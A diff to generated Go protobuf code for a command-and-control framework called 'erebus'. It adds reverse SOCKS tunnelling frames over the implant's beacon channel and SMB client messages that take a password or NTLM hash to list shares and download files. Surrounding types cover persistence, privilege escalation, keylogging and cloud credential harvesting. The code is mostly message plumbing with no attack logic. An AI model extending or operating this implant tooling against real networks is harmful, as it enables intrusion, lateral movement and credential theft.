@@ -148,6 +148,62 @@ func (TaskType) EnumDescriptor() ([]byte, []int) {
 	return file_c2_proto_rawDescGZIP(), []int{0}
 }
 
+// Reverse SOCKS frames multiplexed over the encrypted beacon channel.
+type SocksFrameOp int32
+
+const (
+	SocksFrameOp_SOCKS_FRAME_UNSPECIFIED SocksFrameOp = 0
+	SocksFrameOp_SOCKS_OPEN              SocksFrameOp = 1 // server → implant: open dial to target
+	SocksFrameOp_SOCKS_OPEN_RESULT       SocksFrameOp = 2 // implant → server
+	SocksFrameOp_SOCKS_DATA              SocksFrameOp = 3 // bidirectional payload
+	SocksFrameOp_SOCKS_CLOSE             SocksFrameOp = 4 // bidirectional
+)
+
+// Enum value maps for SocksFrameOp.
+var (
+	SocksFrameOp_name = map[int32]string{
+		0: "SOCKS_FRAME_UNSPECIFIED",
+		1: "SOCKS_OPEN",
+		2: "SOCKS_OPEN_RESULT",
+		3: "SOCKS_DATA",
+		4: "SOCKS_CLOSE",
+	}
+	SocksFrameOp_value = map[string]int32{
+		"SOCKS_FRAME_UNSPECIFIED": 0,
+		"SOCKS_OPEN":              1,
+		"SOCKS_OPEN_RESULT":       2,
+		"SOCKS_DATA":              3,
+		"SOCKS_CLOSE":             4,
+	}
+)
+
+func (x SocksFrameOp) Enum() *SocksFrameOp {
+	p := new(SocksFrameOp)
+	*p = x
+	return p
+}
+
+func (x SocksFrameOp) String() string {
+	return protoimpl.X.EnumStringOf(x.Descriptor(), protoreflect.EnumNumber(x))
+}
+
+func (SocksFrameOp) Descriptor() protoreflect.EnumDescriptor {
+	return file_c2_proto_enumTypes[1].Descriptor()
+}
+
+func (SocksFrameOp) Type() protoreflect.EnumType {
+	return &file_c2_proto_enumTypes[1]
+}
+
+func (x SocksFrameOp) Number() protoreflect.EnumNumber {
+	return protoreflect.EnumNumber(x)
+}
+
+// Deprecated: Use SocksFrameOp.Descriptor instead.
+func (SocksFrameOp) EnumDescriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{1}
+}
+
 type Register struct {
 	state          protoimpl.MessageState `protogen:"open.v1"`
 	ImplantId      string                 `protobuf:"bytes,1,opt,name=implant_id,json=implantId,proto3" json:"implant_id,omitempty"`
@@ -632,6 +688,7 @@ func (x *TaskResult) GetExecutionTimeMs() int64 {
 type BeaconResultsPayload struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
 	Results       []*TaskResult          `protobuf:"bytes,1,rep,name=results,proto3" json:"results,omitempty"`
+	SocksFrames   []*SocksFrame          `protobuf:"bytes,2,rep,name=socks_frames,json=socksFrames,proto3" json:"socks_frames,omitempty"` // implant → server reverse SOCKS
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -673,9 +730,17 @@ func (x *BeaconResultsPayload) GetResults() []*TaskResult {
 	return nil
 }
 
+func (x *BeaconResultsPayload) GetSocksFrames() []*SocksFrame {
+	if x != nil {
+		return x.SocksFrames
+	}
+	return nil
+}
+
 type BeaconTasksPayload struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
 	Tasks         []*Task                `protobuf:"bytes,1,rep,name=tasks,proto3" json:"tasks,omitempty"`
+	SocksFrames   []*SocksFrame          `protobuf:"bytes,2,rep,name=socks_frames,json=socksFrames,proto3" json:"socks_frames,omitempty"` // server → implant reverse SOCKS
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -713,6 +778,13 @@ func (*BeaconTasksPayload) Descriptor() ([]byte, []int) {
 func (x *BeaconTasksPayload) GetTasks() []*Task {
 	if x != nil {
 		return x.Tasks
+	}
+	return nil
+}
+
+func (x *BeaconTasksPayload) GetSocksFrames() []*SocksFrame {
+	if x != nil {
+		return x.SocksFrames
 	}
 	return nil
 }
@@ -3363,7 +3435,7 @@ func (x *KeylogEntry) GetTimestamp() int64 {
 
 type SocksStartTask struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
-	Port          uint32                 `protobuf:"varint,1,opt,name=port,proto3" json:"port,omitempty"`
+	Port          uint32                 `protobuf:"varint,1,opt,name=port,proto3" json:"port,omitempty"` // teamserver listen port (relay mode); implant enables reverse agent
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -3537,6 +3609,82 @@ func (x *SocksStopResult) GetSuccess() bool {
 	return false
 }
 
+type SocksFrame struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	ConnId        uint32                 `protobuf:"varint,1,opt,name=conn_id,json=connId,proto3" json:"conn_id,omitempty"`
+	Op            SocksFrameOp           `protobuf:"varint,2,opt,name=op,proto3,enum=erebus.c2.SocksFrameOp" json:"op,omitempty"`
+	Target        string                 `protobuf:"bytes,3,opt,name=target,proto3" json:"target,omitempty"` // host:port for OPEN
+	Data          []byte                 `protobuf:"bytes,4,opt,name=data,proto3" json:"data,omitempty"`
+	Status        int32                  `protobuf:"varint,5,opt,name=status,proto3" json:"status,omitempty"` // 0 = ok
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *SocksFrame) Reset() {
+	*x = SocksFrame{}
+	mi := &file_c2_proto_msgTypes[57]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *SocksFrame) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*SocksFrame) ProtoMessage() {}
+
+func (x *SocksFrame) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[57]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use SocksFrame.ProtoReflect.Descriptor instead.
+func (*SocksFrame) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{57}
+}
+
+func (x *SocksFrame) GetConnId() uint32 {
+	if x != nil {
+		return x.ConnId
+	}
+	return 0
+}
+
+func (x *SocksFrame) GetOp() SocksFrameOp {
+	if x != nil {
+		return x.Op
+	}
+	return SocksFrameOp_SOCKS_FRAME_UNSPECIFIED
+}
+
+func (x *SocksFrame) GetTarget() string {
+	if x != nil {
+		return x.Target
+	}
+	return ""
+}
+
+func (x *SocksFrame) GetData() []byte {
+	if x != nil {
+		return x.Data
+	}
+	return nil
+}
+
+func (x *SocksFrame) GetStatus() int32 {
+	if x != nil {
+		return x.Status
+	}
+	return 0
+}
+
 type PersistConfig struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
 	Method        string                 `protobuf:"bytes,1,opt,name=method,proto3" json:"method,omitempty"`
@@ -3550,7 +3698,7 @@ type PersistConfig struct {
 
 func (x *PersistConfig) Reset() {
 	*x = PersistConfig{}
-	mi := &file_c2_proto_msgTypes[57]
+	mi := &file_c2_proto_msgTypes[58]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3562,7 +3710,7 @@ func (x *PersistConfig) String() string {
 func (*PersistConfig) ProtoMessage() {}
 
 func (x *PersistConfig) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[57]
+	mi := &file_c2_proto_msgTypes[58]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3575,7 +3723,7 @@ func (x *PersistConfig) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use PersistConfig.ProtoReflect.Descriptor instead.
 func (*PersistConfig) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{57}
+	return file_c2_proto_rawDescGZIP(), []int{58}
 }
 
 func (x *PersistConfig) GetMethod() string {
@@ -3624,7 +3772,7 @@ type PersistResult struct {
 
 func (x *PersistResult) Reset() {
 	*x = PersistResult{}
-	mi := &file_c2_proto_msgTypes[58]
+	mi := &file_c2_proto_msgTypes[59]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3636,7 +3784,7 @@ func (x *PersistResult) String() string {
 func (*PersistResult) ProtoMessage() {}
 
 func (x *PersistResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[58]
+	mi := &file_c2_proto_msgTypes[59]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3649,7 +3797,7 @@ func (x *PersistResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use PersistResult.ProtoReflect.Descriptor instead.
 func (*PersistResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{58}
+	return file_c2_proto_rawDescGZIP(), []int{59}
 }
 
 func (x *PersistResult) GetSuccess() bool {
@@ -3684,7 +3832,7 @@ type PrivescConfig struct {
 
 func (x *PrivescConfig) Reset() {
 	*x = PrivescConfig{}
-	mi := &file_c2_proto_msgTypes[59]
+	mi := &file_c2_proto_msgTypes[60]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3696,7 +3844,7 @@ func (x *PrivescConfig) String() string {
 func (*PrivescConfig) ProtoMessage() {}
 
 func (x *PrivescConfig) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[59]
+	mi := &file_c2_proto_msgTypes[60]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3709,7 +3857,7 @@ func (x *PrivescConfig) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use PrivescConfig.ProtoReflect.Descriptor instead.
 func (*PrivescConfig) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{59}
+	return file_c2_proto_rawDescGZIP(), []int{60}
 }
 
 func (x *PrivescConfig) GetMethod() string {
@@ -3745,7 +3893,7 @@ type PrivescResult struct {
 
 func (x *PrivescResult) Reset() {
 	*x = PrivescResult{}
-	mi := &file_c2_proto_msgTypes[60]
+	mi := &file_c2_proto_msgTypes[61]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3757,7 +3905,7 @@ func (x *PrivescResult) String() string {
 func (*PrivescResult) ProtoMessage() {}
 
 func (x *PrivescResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[60]
+	mi := &file_c2_proto_msgTypes[61]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3770,7 +3918,7 @@ func (x *PrivescResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use PrivescResult.ProtoReflect.Descriptor instead.
 func (*PrivescResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{60}
+	return file_c2_proto_rawDescGZIP(), []int{61}
 }
 
 func (x *PrivescResult) GetSuccess() bool {
@@ -3811,7 +3959,7 @@ type CloudHarvestConfig struct {
 
 func (x *CloudHarvestConfig) Reset() {
 	*x = CloudHarvestConfig{}
-	mi := &file_c2_proto_msgTypes[61]
+	mi := &file_c2_proto_msgTypes[62]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3823,7 +3971,7 @@ func (x *CloudHarvestConfig) String() string {
 func (*CloudHarvestConfig) ProtoMessage() {}
 
 func (x *CloudHarvestConfig) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[61]
+	mi := &file_c2_proto_msgTypes[62]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3836,7 +3984,7 @@ func (x *CloudHarvestConfig) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use CloudHarvestConfig.ProtoReflect.Descriptor instead.
 func (*CloudHarvestConfig) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{61}
+	return file_c2_proto_rawDescGZIP(), []int{62}
 }
 
 func (x *CloudHarvestConfig) GetProvider() string {
@@ -3868,7 +4016,7 @@ type CloudHarvestResult struct {
 
 func (x *CloudHarvestResult) Reset() {
 	*x = CloudHarvestResult{}
-	mi := &file_c2_proto_msgTypes[62]
+	mi := &file_c2_proto_msgTypes[63]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3880,7 +4028,7 @@ func (x *CloudHarvestResult) String() string {
 func (*CloudHarvestResult) ProtoMessage() {}
 
 func (x *CloudHarvestResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[62]
+	mi := &file_c2_proto_msgTypes[63]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3893,7 +4041,7 @@ func (x *CloudHarvestResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use CloudHarvestResult.ProtoReflect.Descriptor instead.
 func (*CloudHarvestResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{62}
+	return file_c2_proto_rawDescGZIP(), []int{63}
 }
 
 func (x *CloudHarvestResult) GetProvider() string {
@@ -3962,7 +4110,7 @@ type CloudToken struct {
 
 func (x *CloudToken) Reset() {
 	*x = CloudToken{}
-	mi := &file_c2_proto_msgTypes[63]
+	mi := &file_c2_proto_msgTypes[64]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -3974,7 +4122,7 @@ func (x *CloudToken) String() string {
 func (*CloudToken) ProtoMessage() {}
 
 func (x *CloudToken) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[63]
+	mi := &file_c2_proto_msgTypes[64]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -3987,7 +4135,7 @@ func (x *CloudToken) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use CloudToken.ProtoReflect.Descriptor instead.
 func (*CloudToken) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{63}
+	return file_c2_proto_rawDescGZIP(), []int{64}
 }
 
 func (x *CloudToken) GetProvider() string {
@@ -4067,7 +4215,7 @@ type CloudCredential struct {
 
 func (x *CloudCredential) Reset() {
 	*x = CloudCredential{}
-	mi := &file_c2_proto_msgTypes[64]
+	mi := &file_c2_proto_msgTypes[65]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -4079,7 +4227,7 @@ func (x *CloudCredential) String() string {
 func (*CloudCredential) ProtoMessage() {}
 
 func (x *CloudCredential) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[64]
+	mi := &file_c2_proto_msgTypes[65]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -4092,7 +4240,7 @@ func (x *CloudCredential) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use CloudCredential.ProtoReflect.Descriptor instead.
 func (*CloudCredential) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{64}
+	return file_c2_proto_rawDescGZIP(), []int{65}
 }
 
 func (x *CloudCredential) GetProvider() string {
@@ -4135,6 +4283,222 @@ func (x *CloudCredential) GetSource() string {
 		return x.Source
 	}
 	return ""
+}
+
+type SMBClientConfig struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Action        string                 `protobuf:"bytes,1,opt,name=action,proto3" json:"action,omitempty"` // list_shares | list_dir | download
+	Host          string                 `protobuf:"bytes,2,opt,name=host,proto3" json:"host,omitempty"`
+	Share         string                 `protobuf:"bytes,3,opt,name=share,proto3" json:"share,omitempty"` // required for list_dir / download
+	Path          string                 `protobuf:"bytes,4,opt,name=path,proto3" json:"path,omitempty"`   // path within share (list_dir dir or download file)
+	Domain        string                 `protobuf:"bytes,5,opt,name=domain,proto3" json:"domain,omitempty"`
+	Username      string                 `protobuf:"bytes,6,opt,name=username,proto3" json:"username,omitempty"`
+	Password      string                 `protobuf:"bytes,7,opt,name=password,proto3" json:"password,omitempty"`
+	NtlmHash      string                 `protobuf:"bytes,8,opt,name=ntlm_hash,json=ntlmHash,proto3" json:"ntlm_hash,omitempty"`
+	Anonymous     bool                   `protobuf:"varint,9,opt,name=anonymous,proto3" json:"anonymous,omitempty"`
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *SMBClientConfig) Reset() {
+	*x = SMBClientConfig{}
+	mi := &file_c2_proto_msgTypes[66]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *SMBClientConfig) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*SMBClientConfig) ProtoMessage() {}
+
+func (x *SMBClientConfig) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[66]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use SMBClientConfig.ProtoReflect.Descriptor instead.
+func (*SMBClientConfig) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{66}
+}
+
+func (x *SMBClientConfig) GetAction() string {
+	if x != nil {
+		return x.Action
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetHost() string {
+	if x != nil {
+		return x.Host
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetShare() string {
+	if x != nil {
+		return x.Share
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetPath() string {
+	if x != nil {
+		return x.Path
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetDomain() string {
+	if x != nil {
+		return x.Domain
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetUsername() string {
+	if x != nil {
+		return x.Username
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetPassword() string {
+	if x != nil {
+		return x.Password
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetNtlmHash() string {
+	if x != nil {
+		return x.NtlmHash
+	}
+	return ""
+}
+
+func (x *SMBClientConfig) GetAnonymous() bool {
+	if x != nil {
+		return x.Anonymous
+	}
+	return false
+}
+
+type SMBClientResult struct {
+	state                protoimpl.MessageState `protogen:"open.v1"`
+	Action               string                 `protobuf:"bytes,1,opt,name=action,proto3" json:"action,omitempty"`
+	Host                 string                 `protobuf:"bytes,2,opt,name=host,proto3" json:"host,omitempty"`
+	Share                string                 `protobuf:"bytes,3,opt,name=share,proto3" json:"share,omitempty"`
+	Path                 string                 `protobuf:"bytes,4,opt,name=path,proto3" json:"path,omitempty"`
+	Names                []string               `protobuf:"bytes,5,rep,name=names,proto3" json:"names,omitempty"`                       // share or directory entries
+	FileData             []byte                 `protobuf:"bytes,6,opt,name=file_data,json=fileData,proto3" json:"file_data,omitempty"` // download payload
+	FileSize             int64                  `protobuf:"varint,7,opt,name=file_size,json=fileSize,proto3" json:"file_size,omitempty"`
+	Error                string                 `protobuf:"bytes,8,opt,name=error,proto3" json:"error,omitempty"`
+	NextSuggestedActions []string               `protobuf:"bytes,9,rep,name=next_suggested_actions,json=nextSuggestedActions,proto3" json:"next_suggested_actions,omitempty"`
+	unknownFields        protoimpl.UnknownFields
+	sizeCache            protoimpl.SizeCache
+}
+
+func (x *SMBClientResult) Reset() {
+	*x = SMBClientResult{}
+	mi := &file_c2_proto_msgTypes[67]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *SMBClientResult) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*SMBClientResult) ProtoMessage() {}
+
+func (x *SMBClientResult) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[67]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use SMBClientResult.ProtoReflect.Descriptor instead.
+func (*SMBClientResult) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{67}
+}
+
+func (x *SMBClientResult) GetAction() string {
+	if x != nil {
+		return x.Action
+	}
+	return ""
+}
+
+func (x *SMBClientResult) GetHost() string {
+	if x != nil {
+		return x.Host
+	}
+	return ""
+}
+
+func (x *SMBClientResult) GetShare() string {
+	if x != nil {
+		return x.Share
+	}
+	return ""
+}
+
+func (x *SMBClientResult) GetPath() string {
+	if x != nil {
+		return x.Path
+	}
+	return ""
+}
+
+func (x *SMBClientResult) GetNames() []string {
+	if x != nil {
+		return x.Names
+	}
+	return nil
+}
+
+func (x *SMBClientResult) GetFileData() []byte {
+	if x != nil {
+		return x.FileData
+	}
+	return nil
+}
+
+func (x *SMBClientResult) GetFileSize() int64 {
+	if x != nil {
+		return x.FileSize
+	}
+	return 0
+}
+
+func (x *SMBClientResult) GetError() string {
+	if x != nil {
+		return x.Error
+	}
+	return ""
+}
+
+func (x *SMBClientResult) GetNextSuggestedActions() []string {
+	if x != nil {
+		return x.NextSuggestedActions
+	}
+	return nil
 }
 
 var File_c2_proto protoreflect.FileDescriptor
@@ -4187,11 +4551,13 @@ const file_c2_proto_rawDesc = "" +
 	"\asuccess\x18\x02 \x01(\bR\asuccess\x12\x12\n" +
 	"\x04data\x18\x03 \x01(\fR\x04data\x12\x14\n" +
 	"\x05error\x18\x04 \x01(\tR\x05error\x12*\n" +
-	"\x11execution_time_ms\x18\x05 \x01(\x03R\x0fexecutionTimeMs\"G\n" +
+	"\x11execution_time_ms\x18\x05 \x01(\x03R\x0fexecutionTimeMs\"\x81\x01\n" +
 	"\x14BeaconResultsPayload\x12/\n" +
-	"\aresults\x18\x01 \x03(\v2\x15.erebus.c2.TaskResultR\aresults\";\n" +
+	"\aresults\x18\x01 \x03(\v2\x15.erebus.c2.TaskResultR\aresults\x128\n" +
+	"\fsocks_frames\x18\x02 \x03(\v2\x15.erebus.c2.SocksFrameR\vsocksFrames\"u\n" +
 	"\x12BeaconTasksPayload\x12%\n" +
-	"\x05tasks\x18\x01 \x03(\v2\x0f.erebus.c2.TaskR\x05tasks\"9\n" +
+	"\x05tasks\x18\x01 \x03(\v2\x0f.erebus.c2.TaskR\x05tasks\x128\n" +
+	"\fsocks_frames\x18\x02 \x03(\v2\x15.erebus.c2.SocksFrameR\vsocksFrames\"9\n" +
 	"\tShellTask\x12\x18\n" +
 	"\acommand\x18\x01 \x01(\tR\acommand\x12\x12\n" +
 	"\x04args\x18\x02 \x03(\tR\x04args\"Z\n" +
@@ -4404,6 +4770,13 @@ const file_c2_proto_rawDesc = "" +
 	"\rSocksStopTask\"+\n" +
 	"\x0fSocksStopResult\x12\x18\n" +
 	"\asuccess\x18\x01 \x01(\bR\asuccess\"\x92\x01\n" +
+	"\n" +
+	"SocksFrame\x12\x17\n" +
+	"\aconn_id\x18\x01 \x01(\rR\x06connId\x12'\n" +
+	"\x02op\x18\x02 \x01(\x0e2\x17.erebus.c2.SocksFrameOpR\x02op\x12\x16\n" +
+	"\x06target\x18\x03 \x01(\tR\x06target\x12\x12\n" +
+	"\x04data\x18\x04 \x01(\fR\x04data\x12\x16\n" +
+	"\x06status\x18\x05 \x01(\x05R\x06status\"\x92\x01\n" +
 	"\rPersistConfig\x12\x16\n" +
 	"\x06method\x18\x01 \x01(\tR\x06method\x12\x12\n" +
 	"\x04name\x18\x02 \x01(\tR\x04name\x12!\n" +
@@ -4454,7 +4827,27 @@ const file_c2_proto_rawDesc = "" +
 	"\bidentity\x18\x03 \x01(\tR\bidentity\x12\x16\n" +
 	"\x06secret\x18\x04 \x01(\tR\x06secret\x12\x14\n" +
 	"\x05extra\x18\x05 \x01(\tR\x05extra\x12\x16\n" +
-	"\x06source\x18\x06 \x01(\tR\x06source*\xdc\x04\n" +
+	"\x06source\x18\x06 \x01(\tR\x06source\"\xf2\x01\n" +
+	"\x0fSMBClientConfig\x12\x16\n" +
+	"\x06action\x18\x01 \x01(\tR\x06action\x12\x12\n" +
+	"\x04host\x18\x02 \x01(\tR\x04host\x12\x14\n" +
+	"\x05share\x18\x03 \x01(\tR\x05share\x12\x12\n" +
+	"\x04path\x18\x04 \x01(\tR\x04path\x12\x16\n" +
+	"\x06domain\x18\x05 \x01(\tR\x06domain\x12\x1a\n" +
+	"\busername\x18\x06 \x01(\tR\busername\x12\x1a\n" +
+	"\bpassword\x18\a \x01(\tR\bpassword\x12\x1b\n" +
+	"\tntlm_hash\x18\b \x01(\tR\bntlmHash\x12\x1c\n" +
+	"\tanonymous\x18\t \x01(\bR\tanonymous\"\x83\x02\n" +
+	"\x0fSMBClientResult\x12\x16\n" +
+	"\x06action\x18\x01 \x01(\tR\x06action\x12\x12\n" +
+	"\x04host\x18\x02 \x01(\tR\x04host\x12\x14\n" +
+	"\x05share\x18\x03 \x01(\tR\x05share\x12\x12\n" +
+	"\x04path\x18\x04 \x01(\tR\x04path\x12\x14\n" +
+	"\x05names\x18\x05 \x03(\tR\x05names\x12\x1b\n" +
+	"\tfile_data\x18\x06 \x01(\fR\bfileData\x12\x1b\n" +
+	"\tfile_size\x18\a \x01(\x03R\bfileSize\x12\x14\n" +
+	"\x05error\x18\b \x01(\tR\x05error\x124\n" +
+	"\x16next_suggested_actions\x18\t \x03(\tR\x14nextSuggestedActions*\xdc\x04\n" +
 	"\bTaskType\x12\x10\n" +
 	"\fTASK_UNKNOWN\x10\x00\x12\x0e\n" +
 	"\n" +
@@ -4487,7 +4880,15 @@ const file_c2_proto_rawDesc = "" +
 	"\x11TASK_LATERAL_MOVE\x10\x19\x12\x15\n" +
 	"\x11TASK_PE_LOAD_EXEC\x10\x1a\x12\x10\n" +
 	"\fTASK_PERSIST\x10\x1b\x12\x10\n" +
-	"\fTASK_PRIVESC\x10\x1cB5Z3github.com/KKingZero/erebus-exploit-framwork/pkg/pbb\x06proto3"
+	"\fTASK_PRIVESC\x10\x1c*s\n" +
+	"\fSocksFrameOp\x12\x1b\n" +
+	"\x17SOCKS_FRAME_UNSPECIFIED\x10\x00\x12\x0e\n" +
+	"\n" +
+	"SOCKS_OPEN\x10\x01\x12\x15\n" +
+	"\x11SOCKS_OPEN_RESULT\x10\x02\x12\x0e\n" +
+	"\n" +
+	"SOCKS_DATA\x10\x03\x12\x0f\n" +
+	"\vSOCKS_CLOSE\x10\x04B5Z3github.com/KKingZero/erebus-exploit-framwork/pkg/pbb\x06proto3"
 
 var (
 	file_c2_proto_rawDescOnce sync.Once
@@ -4501,100 +4902,107 @@ func file_c2_proto_rawDescGZIP() []byte {
 	return file_c2_proto_rawDescData
 }
 
-var file_c2_proto_enumTypes = make([]protoimpl.EnumInfo, 1)
-var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 66)
+var file_c2_proto_enumTypes = make([]protoimpl.EnumInfo, 2)
+var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 69)
 var file_c2_proto_goTypes = []any{
 	(TaskType)(0),                // 0: erebus.c2.TaskType
-	(*Register)(nil),             // 1: erebus.c2.Register
-	(*RegisterResponse)(nil),     // 2: erebus.c2.RegisterResponse
-	(*Beacon)(nil),               // 3: erebus.c2.Beacon
-	(*BeaconResponse)(nil),       // 4: erebus.c2.BeaconResponse
-	(*Task)(nil),                 // 5: erebus.c2.Task
-	(*TaskResult)(nil),           // 6: erebus.c2.TaskResult
-	(*BeaconResultsPayload)(nil), // 7: erebus.c2.BeaconResultsPayload
-	(*BeaconTasksPayload)(nil),   // 8: erebus.c2.BeaconTasksPayload
-	(*ShellTask)(nil),            // 9: erebus.c2.ShellTask
-	(*ShellResult)(nil),          // 10: erebus.c2.ShellResult
-	(*FileDownloadTask)(nil),     // 11: erebus.c2.FileDownloadTask
-	(*FileDownloadResult)(nil),   // 12: erebus.c2.FileDownloadResult
-	(*FileUploadTask)(nil),       // 13: erebus.c2.FileUploadTask
-	(*FileUploadResult)(nil),     // 14: erebus.c2.FileUploadResult
-	(*SleepTask)(nil),            // 15: erebus.c2.SleepTask
-	(*ModuleTask)(nil),           // 16: erebus.c2.ModuleTask
-	(*ProcessListTask)(nil),      // 17: erebus.c2.ProcessListTask
-	(*ProcessListResult)(nil),    // 18: erebus.c2.ProcessListResult
-	(*ProcessInfo)(nil),          // 19: erebus.c2.ProcessInfo
-	(*ProcessKillTask)(nil),      // 20: erebus.c2.ProcessKillTask
-	(*ProcessKillResult)(nil),    // 21: erebus.c2.ProcessKillResult
-	(*NetIfconfigTask)(nil),      // 22: erebus.c2.NetIfconfigTask
-	(*NetIfconfigResult)(nil),    // 23: erebus.c2.NetIfconfigResult
-	(*NetInterface)(nil),         // 24: erebus.c2.NetInterface
-	(*NetPortscanTask)(nil),      // 25: erebus.c2.NetPortscanTask
-	(*NetPortscanResult)(nil),    // 26: erebus.c2.NetPortscanResult
-	(*PortResult)(nil),           // 27: erebus.c2.PortResult
-	(*LDAPEnumConfig)(nil),       // 28: erebus.c2.LDAPEnumConfig
-	(*LDAPEnumResult)(nil),       // 29: erebus.c2.LDAPEnumResult
